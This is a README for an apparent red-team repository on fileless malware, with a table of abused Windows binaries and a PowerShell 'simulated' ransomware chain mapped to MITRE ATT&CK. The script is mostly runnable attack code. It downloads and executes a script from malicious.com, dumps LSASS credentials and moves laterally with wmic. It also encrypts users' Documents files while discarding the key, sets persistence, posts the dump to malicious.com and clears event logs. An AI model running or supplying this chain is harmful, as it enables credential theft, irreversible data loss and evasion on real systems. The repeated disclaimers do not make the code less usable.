

# ⚠️ Advisory & Legal Notice: Educational and Authorized Research Use Only

This repository presents **advanced cybersecurity simulation tools and techniques**, primarily intended for:

- Fileless malware behavior emulation  
- Living-off-the-Land Binaries (LOLBins) abuse scenarios  
- Offensive security automation (e.g., PrintNightmare, SpoolFool)  
- Adversary emulation within red/purple team operations  
- Drive-by payload structures and phishing simulation  
- CI/CD exploitation via GitHub Actions in lab environments  

> **This repository is strictly for research, education, and authorized simulation use.**  
> All materials are to be used exclusively within the following environments:
> 
> - Cybersecurity research labs  
> - Adversary emulation platforms and red/purple team frameworks  
> - SOC detection validation via cyber ranges  
> - Blue Team response exercises  
> - Controlled malware analysis environments  

---

## 🧪 For Lab-Based Simulation Only

This repository is intended to **simulate real-world adversarial behavior** under **isolated, controlled, and authorized conditions only**.  
Deployment on production systems, third-party networks, or any environment without **explicit, written authorization** is strictly prohibited.

---

## ❌ Unauthorized Usage Prohibited

- This content must **never** be used for malicious, unlawful, or unethical purposes.  
- **Misuse may violate international, federal, or local cybersecurity laws.**  
- Authors and contributors assume **no liability** for any damage or legal consequences resulting from misuse or improper replication of this content.

---

## ✅ Usage Agreement

By accessing, cloning, or executing this repository, you agree to the following:

- You will use this content **only in compliance** with applicable laws, regulations, and institutional security policies.  
- You accept **full responsibility** for the outcomes and legal implications of your usage.  
- You are authorized to conduct security testing in your target environment or have written permission to do so.

---

**⚖️ Unsure whether your use is authorized? Do not proceed.  
Consult your organization's legal, compliance, or security leadership before using this repository.**

---

## 🧠 NSFW – Advanced Fileless Malware Emulation

![Fileless Malware Concept](https://github.com/user-attachments/assets/3108f067-a49b-45c1-b1c4-07691881c76b)

---

## 🧩 LOLBins 101: Living-Off-the-Land Binaries & Scripts

**LOLBins** are legitimate system tools native to Windows environments that can be weaponized by adversaries to execute arbitrary code, establish persistence, and evade detection.

### ⚙️ Commonly Abused LOLBins

| Binary               | Primary Abuse Vector             | Related MITRE Tactics                  |
|----------------------|----------------------------------|----------------------------------------|
| `rundll32.exe`       | Reflective DLL execution         | Execution, Defense Evasion             |
| `mshta.exe`          | HTA script execution             | Obfuscation, Sandbox Evasion           |
| `regsvr32.exe`       | COM object loading               | Fileless Execution, C2 Communication   |
| `wmic.exe`           | Remote command execution         | Lateral Movement, Discovery            |
| `cmd.exe / powershell.exe` | Script execution          | Payload Staging, Persistence           |
| `msbuild.exe`        | Runtime C# compilation           | Fileless Malware Deployment            |
| `certutil.exe`       | File download/decode             | Staging, Exfiltration                  |
| `bitsadmin.exe`      | Background file transfers         | Task Persistence, Delivery             |
| `schtasks.exe`       | Scheduled task creation          | Privilege Escalation, Persistence      |
| `esentutl.exe`       | Arbitrary binary copying         | Covert Execution, Exfiltration         |

---

## 🧬 Simulation: 100% Fileless Ransomware Chain  
*Mapped using the [MITRE ATT&CK Framework](https://attack.mitre.org/)*

> ⚠️ **Legal Disclaimer**: The following simulation script is a **synthetic red team emulation sample** and **must not be executed outside of a properly sandboxed or isolated testing environment**.

<details>
<summary>Click to view simulated PowerShell ransomware TTP chain</summary>

```powershell
# 🎯 Initial Access (T1190)
$payloadUrl = "http://malicious.com/dropper.ps1"
IEX(New-Object Net.WebClient).DownloadString($payloadUrl)

# ⚡ Execution (T1059.001)
$encPayload = "[Base64-Encoded Payload]"
$decodedPayload = [System.Convert]::FromBase64String($encPayload)
[System.Reflection.Assembly]::Load($decodedPayload)

# 🔓 Privilege Escalation (T1548)
Start-Process "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File elevate.ps1" -Verb RunAs

# 🧪 Credential Access (T1003.001)
Invoke-Expression "rundll32.exe comsvcs.dll, MiniDump (Get-Process lsass).Id dump.dmp full"

# 🔍 Discovery (T1082)
Get-WmiObject Win32_ComputerSystem | Select Name, Domain, UserName
Get-NetAdapter | Select Name, MacAddress

# 🌐 Lateral Movement (T1021.001)
wmic /node:targetPC process call create "powershell -File payload.ps1"

# 💣 Impact: File Encryption (T1486)
$files = Get-ChildItem "C:\Users\*\Documents" -Include *.txt,*.docx -Recurse
foreach ($f in $files) {
    $data = Get-Content $f.FullName -Raw
    $key = (1..32 | ForEach { [char](Get-Random -Min 65 -Max 90) }) -join ''
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = [Text.Encoding]::UTF8.GetBytes($key.PadRight(32,'X'))
    $aes.IV = New-Object byte[] 16
    $enc = $aes.CreateEncryptor()
    $bytes = [Text.Encoding]::UTF8.GetBytes($data)
    $encData = [Convert]::ToBase64String($enc.TransformFinalBlock($bytes,0,$bytes.Length))
    Set-Content -Path $f.FullName -Value $encData
}

# 📌 Persistence (T1547.001)
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "powershell -File persist.ps1"
schtasks /create /tn "UpdaterTask" /tr "powershell -File persist.ps1" /sc onlogon /rl highest

# 📤 Exfiltration (T1041)
$exfil = [Convert]::ToBase64String([IO.File]::ReadAllBytes("dump.dmp"))
Invoke-WebRequest -Uri "http://malicious.com/exfil" -Method Post -Body $exfil

# 🧹 Defense Evasion (T1070)
Remove-Item C:\Windows\Temp\* -Recurse -Force
wevtutil cl System; wevtutil cl Security; wevtutil cl Application
```

</details>

---

## 🔗 Recommended Resources & Tools

- [PrintNightmare – Exploit Analysis](https://itm4n.github.io/printnightmare-not-over/)  
- [Printer Spooler Vulnerability Summary](https://cybersparksdotblog.wordpress.com/2024/11/25/windows-print-spooler-eop-the-printnightmare-of-2021/)  
- [LOLOL Farm – LOLBin Sandbox](https://lolol.farm/)  
- [MITRE ATT&CK - T1218 Reference](https://attack.mitre.org/techniques/T1218/)  
- [LOLGEN – Chain Generator](https://lolgen.hdks.org/)  
- [Wikipedia – Fileless Malware](https://en.wikipedia.org/wiki/Fileless_malware)  
- [DLL Injection Techniques](https://www.crow.rip/crows-nest/mal/dev/inject/dll-injection)  
- [Printer Exploitation Toolkit](https://github.com/jacob-baines/concealed_position)

---

### 🛡️ Closing Statement

This repository is a **research artifact** intended solely for use by cybersecurity professionals, red team operators, and academic researchers.  
Use is governed by your local and international laws, organizational policies, and ethical standards. Unauthorized use or replication of these techniques in real-world systems is **strictly prohibited**.

